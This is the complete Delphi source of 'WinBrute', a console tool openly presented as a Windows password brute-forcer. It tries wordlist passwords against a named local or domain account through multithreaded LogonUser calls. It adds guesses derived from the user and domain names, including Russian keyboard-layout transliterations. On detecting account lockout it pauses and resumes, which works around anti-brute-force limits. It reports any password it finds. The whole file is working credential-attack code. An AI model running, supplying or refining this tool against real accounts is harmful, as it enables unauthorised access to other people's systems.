{
  Copyright 2012 Stas'M Corp.

  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
}

program WinBrute;

{$APPTYPE CONSOLE}

uses
  SysUtils,
  Windows,
  SyncObjs,
  Classes;

type
  Thr = class(TThread)
    ShortPause: Boolean;
    slp: Cardinal;
    procedure Execute; override;
  end;

var
  Threads: Array of Thr;
  hToken: THandle;
  S: TStringList;
  cnt, cntp: Cardinal;
  ShortPause: Boolean = False;
  user, domain, goodpass: String;
  uCode: LongWord = 0;
  C: TCriticalSection;
  stop, gotit: Boolean;
  OutF: TextFile;

procedure WriteOut(S: String);
begin
  if ParamStr(4) = '' then
    Exit;
  Writeln(OutF, S);
end;

procedure Thr.Execute;
var
  pass: String;
  b: Boolean;
  ErrCode: LongWord;
  Idx, I: Integer;
begin
  inherited;
  Idx := -1;
  while not Terminated do begin
    C.Enter;
    if ShortPause then begin
      C.Leave;
      ShortPause := False;
      Sleep(slp);
      slp := 0;
      C.Enter;
    end;
    if Integer(cnt) >= S.Count - 1 then begin
      C.Leave;
      stop := True;
      Terminate;
      Break;
    end else begin
      Idx := InterlockedIncrement(Integer(cnt));
      pass := S.Strings[Idx];
      C.Leave;
    end;
    b := False;
    try
      if Domain <> '' then
        b := LogonUser(PWideChar(user), PWideChar(domain), PWideChar(pass), LOGON32_LOGON_NETWORK,
        LOGON32_PROVIDER_DEFAULT, hToken)
      else
        b := LogonUser(PWideChar(user), nil, PWideChar(pass), LOGON32_LOGON_NETWORK,
        LOGON32_PROVIDER_DEFAULT, hToken);
    except

    end;
    if b then begin
      CloseHandle(hToken);
      goodpass := pass;
      stop := True;
      gotit := True;
      Break;
    end else begin
      ErrCode := GetLastError;
      case ErrCode of
        ERROR_NOT_SUPPORTED: begin // The request is not supported (Windows failure)
          C.Enter;
          Writeln('[-] ERROR_NOT_SUPPORTED encountered, seems to be general LSASS failure');
          Writeln('[-] Obviously you need to restart your computer');
          Halt(1);
          C.Leave;
        end;
        ERROR_SHUTDOWN_IN_PROGRESS: begin // Shutdown in progress
          C.Enter;
          Writeln('[-] Windows is shutting down');
          Halt(1);
          C.Leave;
        end;
        ERROR_LOGON_FAILURE: ; // The user name or password is incorrect
        ERROR_INVALID_LOGON_HOURS: // Account has time restrictions that keep it from signing in right now
        begin
          C.Enter;
          Writeln('[-] Selected user isn''t allowed to sign in right now');
          Halt(1);
          C.Leave;
        end;
        ERROR_INVALID_WORKSTATION: begin // This user isn't allowed to sign in to this computer
          C.Enter;
          Writeln('[-] Selected user isn''t allowed to sign in to this computer');
          Halt(1);
          C.Leave;
        end;
        ERROR_ACCOUNT_RESTRICTION, // Blank password or sign-in time limitation
        ERROR_PASSWORD_EXPIRED, // Password expired
        ERROR_ACCOUNT_DISABLED, // Account disabled
        ERROR_ACCOUNT_EXPIRED, // Account expired
        ERROR_PASSWORD_MUST_CHANGE: // User must change password
        begin
          goodpass := pass;
          stop := True;
          gotit := True;
          uCode := ErrCode;
          Break;
        end;
        ERROR_NO_LOGON_SERVERS: begin // Logon server is down
          C.Enter;
          InterlockedExchange(Integer(cnt), Idx);
          Writeln('[-] Logon server not responding');
          for I := 0 to Length(Threads) - 1 do begin
            Threads[I].ShortPause := True;
            Threads[I].slp := 5000;
          end;
          C.Leave;
        end;
        ERROR_ACCOUNT_LOCKED_OUT: begin // Anti-bruteforce lock
          C.Enter;
          InterlockedExchange(Integer(cnt), Idx);
          Writeln('[-] Account bruteforce rate limiting detected');
          for I := 0 to Length(Threads) - 1 do begin
            Threads[I].ShortPause := True;
            Threads[I].slp := 5000;
          end;
          C.Leave;
        end;
        else begin
          C.Enter;
          Writeln('[?] Unknown error ', ErrCode);
          if Domain <> '' then
            Writeln('[?] Username: ', ParamStr(3)+'\'+ParamStr(2))
          else
            Writeln('[?] Username: ', ParamStr(2));
          Writeln('[?] Password: ', pass);
          C.Leave;
        end;
      end;
    end;
  end;
end;

function TranslitRu(S: String): String;
var
  I: Integer;
begin
  for I:=1 to Length(S) do
    case S[I] of
      'Q': S[I] := 'É';
      'W': S[I] := 'Ö';
      'E': S[I] := 'Ó';
      'R': S[I] := 'Ê';
      'T': S[I] := 'Å';
      'Y': S[I] := 'Í';
      'U': S[I] := 'Ã';
      'I': S[I] := 'Ø';
      'O': S[I] := 'Ù';
      'P': S[I] := 'Ç';
      '{': S[I] := 'Õ';
      '}': S[I] := 'Ú';
      'A': S[I] := 'Ô';
      'S': S[I] := 'Û';
      'D': S[I] := 'Â';
      'F': S[I] := 'À';
      'G': S[I] := 'Ï';
      'H': S[I] := 'Ð';
      'J': S[I] := 'Î';
      'K': S[I] := 'Ë';
      'L': S[I] := 'Ä';
      ':': S[I] := 'Æ';
      '"': S[I] := 'Ý';
      'Z': S[I] := 'ß';
      'X': S[I] := '×';
      'C': S[I] := 'Ñ';
      'V': S[I] := 'Ì';
      'B': S[I] := 'È';
      'N': S[I] := 'Ò';
      'M': S[I] := 'Ü';
      '<': S[I] := 'Á';
      '>': S[I] := 'Þ';
      '?': S[I] := ',';

      'q': S[I] := 'é';
      'w': S[I] := 'ö';
      'e': S[I] := 'ó';
      'r': S[I] := 'ê';
      't': S[I] := 'å';
      'y': S[I] := 'í';
      'u': S[I] := 'ã';
      'i': S[I] := 'ø';
      'o': S[I] := 'ù';
      'p': S[I] := 'ç';
      '[': S[I] := 'õ';
      ']': S[I] := 'ú';
      'a': S[I] := 'ô';
      's': S[I] := 'û';
      'd': S[I] := 'â';
      'f': S[I] := 'à';
      'g': S[I] := 'ï';
      'h': S[I] := 'ð';
      'j': S[I] := 'î';
      'k': S[I] := 'ë';
      'l': S[I] := 'ä';
      ';': S[I] := 'æ';
      '''': S[I] := 'ý';
      'z': S[I] := 'ÿ';
      'x': S[I] := '÷';
      'c': S[I] := 'ñ';
      'v': S[I] := 'ì';
      'b': S[I] := 'è';
      'n': S[I] := 'ò';
      'm': S[I] := 'ü';
      ',': S[I] := 'á';
      '.': S[I] := 'þ';
      '/': S[I] := '.';

      '|': S[I] := '\';
      '~': S[I] := '¨';
      '`': S[I] := '¸';
      '#': S[I] := '¹';
      //
      'É': S[I] := 'Q';
      'Ö': S[I] := 'W';
      'Ó': S[I] := 'E';
      'Ê': S[I] := 'R';
      'Å': S[I] := 'T';
      'Í': S[I] := 'Y';
      'Ã': S[I] := 'U';
      'Ø': S[I] := 'I';
      'Ù': S[I] := 'O';
      'Ç': S[I] := 'P';
      'Õ': S[I] := '{';
      'Ú': S[I] := '}';
      'Ô': S[I] := 'A';
      'Û': S[I] := 'S';
      'Â': S[I] := 'D';
      'À': S[I] := 'F';
      'Ï': S[I] := 'G';
      'Ð': S[I] := 'H';
      'Î': S[I] := 'J';
      'Ë': S[I] := 'K';
      'Ä': S[I] := 'L';
      'Æ': S[I] := ':';
      'Ý': S[I] := '"';
      'ß': S[I] := 'Z';
      '×': S[I] := 'X';
      'Ñ': S[I] := 'C';
      'Ì': S[I] := 'V';
      'È': S[I] := 'B';
      'Ò': S[I] := 'N';
      'Ü': S[I] := 'M';
      'Á': S[I] := '<';
      'Þ': S[I] := '>';

      'é': S[I] := 'q';
      'ö': S[I] := 'w';
      'ó': S[I] := 'e';
      'ê': S[I] := 'r';
      'å': S[I] := 't';
      'í': S[I] := 'y';
      'ã': S[I] := 'u';
      'ø': S[I] := 'i';
      'ù': S[I] := 'o';
      'ç': S[I] := 'p';
      'õ': S[I] := '[';
      'ú': S[I] := ']';
      'ô': S[I] := 'a';
      'û': S[I] := 's';
      'â': S[I] := 'd';
      'à': S[I] := 'f';
      'ï': S[I] := 'g';
      'ð': S[I] := 'h';
      'î': S[I] := 'j';
      'ë': S[I] := 'k';
      'ä': S[I] := 'l';
      'æ': S[I] := ';';
      'ý': S[I] := '''';
      'ÿ': S[I] := 'z';
      '÷': S[I] := 'x';
      'ñ': S[I] := 'c';
      'ì': S[I] := 'v';
      'è': S[I] := 'b';
      'ò': S[I] := 'n';
      'ü': S[I] := 'm';
      'á': S[I] := ',';
      'þ': S[I] := '.';

      '\': S[I] := '|';
      '¨': S[I] := '~';
      '¸': S[I] := '`';
      '¹': S[I] := '#';
    end;
  Result := S;
end;

var
  I: Integer;
  SI: TSystemInfo;
  cc, lcnt, pcnt: Cardinal;
  ust, unm: String;

begin
  try
    { TODO -oUser -cConsole Main : Insert code here }
    Writeln('Windows Password Brute by Stas''M');
    Writeln('Copyright (C) Stas''M Corp. 2012');
    Writeln('');
    if ParamCount < 2 then begin
      Writeln('USAGE: WinBrute.exe <wordlist> <user> [domain] [outfile]');
      Exit;
    end;
    S := TStringList.Create;
    user := ParamStr(2);
    domain := ParamStr(3);
    if ParamStr(4) <> '' then
    begin
      Assign(OutF, ParamStr(4));
      if not FileExists(ParamStr(4)) then
        Rewrite(OutF)
      else
        Append(OutF);
    end;
    S.LoadFromFile(ParamStr(1));
    S.Text := StringReplace(S.Text, '%username%', user, [rfReplaceAll]);
    S.Insert(0, '');
    S.Insert(0, user);
    S.Insert(0, user+user);
    S.Insert(0, user+user+user);
    S.Insert(0, TranslitRu(user));
    S.Insert(0, TranslitRu(user+user));
    S.Insert(0, TranslitRu(user+user+user));
    if LowerCase(user) <> user then begin
      S.Insert(0, LowerCase(user));
      S.Insert(0, LowerCase(user+user));
      S.Insert(0, LowerCase(user+user+user));
      S.Insert(0, TranslitRu(LowerCase(user)));
      S.Insert(0, TranslitRu(LowerCase(user+user)));
      S.Insert(0, TranslitRu(LowerCase(user+user+user)));
    end;
    if UpperCase(user) <> user then begin
      S.Insert(0, UpperCase(user));
      S.Insert(0, UpperCase(user+user));
      S.Insert(0, UpperCase(user+user+user));
      S.Insert(0, TranslitRu(UpperCase(user)));
      S.Insert(0, TranslitRu(UpperCase(user+user)));
      S.Insert(0, TranslitRu(UpperCase(user+user+user)));
    end;
    if domain <> '' then begin
      S.Insert(0, domain);
      S.Insert(0, domain+domain);
      S.Insert(0, domain+domain+domain);
      S.Insert(0, TranslitRu(domain));
      S.Insert(0, TranslitRu(domain+domain));
      S.Insert(0, TranslitRu(domain+domain+domain));
      if LowerCase(domain) <> domain then begin
        S.Insert(0, LowerCase(domain));
        S.Insert(0, LowerCase(domain+domain));
        S.Insert(0, LowerCase(domain+domain+domain));
        S.Insert(0, TranslitRu(LowerCase(domain)));
        S.Insert(0, TranslitRu(LowerCase(domain+domain)));
        S.Insert(0, TranslitRu(LowerCase(domain+domain+domain)));
      end;
      if UpperCase(domain) <> domain then begin
        S.Insert(0, UpperCase(domain));
        S.Insert(0, UpperCase(domain+domain));
        S.Insert(0, UpperCase(domain+domain+domain));
        S.Insert(0, TranslitRu(UpperCase(domain)));
        S.Insert(0, TranslitRu(UpperCase(domain+domain)));
        S.Insert(0, TranslitRu(UpperCase(domain+domain+domain)));
      end;
    end;
    if Length(user) > 3 then
    begin
      S.Insert(0, user[1] + user[Length(user)-1] + user[Length(user)]);
      S.Insert(0, LowerCase(user[1] + user[Length(user)-1] + user[Length(user)]));
      S.Insert(0, UpperCase(user[1] + user[Length(user)-1] + user[Length(user)]));
    end;
    pcnt := S.Count;
    GetNativeSystemInfo(SI);
    SetLength(Threads, SI.dwNumberOfProcessors);
    goodpass := '';
    stop := False;
    gotit := False;
    cnt := 0;
    cntp := 0;
    C := TCriticalSection.Create;
    for I := 0 to Length(Threads) - 1 do begin
      Threads[I] := Thr.Create(True);
      Threads[I].FreeOnTerminate := True;
      Threads[I].ShortPause := False;
      Threads[I].slp := 0;
    end;
    for I := 0 to Length(Threads) - 1 do
      Threads[I].Start;
    while not stop do begin
      Sleep(1000);
      C.Enter;
      lcnt := cnt;
      C.Leave;
      cc := lcnt - cntp;
      cntp := lcnt;
      Writeln('[*] Rate: ', cc, ' p/s (', Round(lcnt*(100/pcnt)), '%)');
    end;
    C.Free;
    S.Free;
    if gotit then begin
      ust := '';
      unm := '';
      case uCode of
        ERROR_ACCOUNT_RESTRICTION: begin
          Writeln('[*] Warning: Logon is restricted by policy');
          ust := 'restricted';
        end;
        ERROR_PASSWORD_EXPIRED,
        ERROR_ACCOUNT_EXPIRED: begin
          Writeln('[*] Warning: User account has expired');
          ust := 'expired';
        end;
        ERROR_ACCOUNT_DISABLED: begin
          Writeln('[*] Warning: User account is disabled');
          ust := 'disabled';
        end;
        ERROR_PASSWORD_MUST_CHANGE: begin
          Writeln('[*] Warning: User must change password');
          ust := 'change';
        end;
      end;
      if Domain <> '' then
        unm := ParamStr(3) + '\' + ParamStr(2)
      else
        unm := ParamStr(2);
      Writeln('[+] Username: ', unm);
      if goodpass = '' then
      begin
        WriteOut(unm + #9 + '<empty>' + #9 + ust);
        Writeln('[+] Empty password');
      end
      else begin
        WriteOut(unm + #9 + goodpass + #9 + ust);
        Writeln('[+] Password: ', goodpass);
      end;
    end else
      Writeln('[-] Password not found');
    if ParamStr(4) <> '' then
      CloseFile(OutF);
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
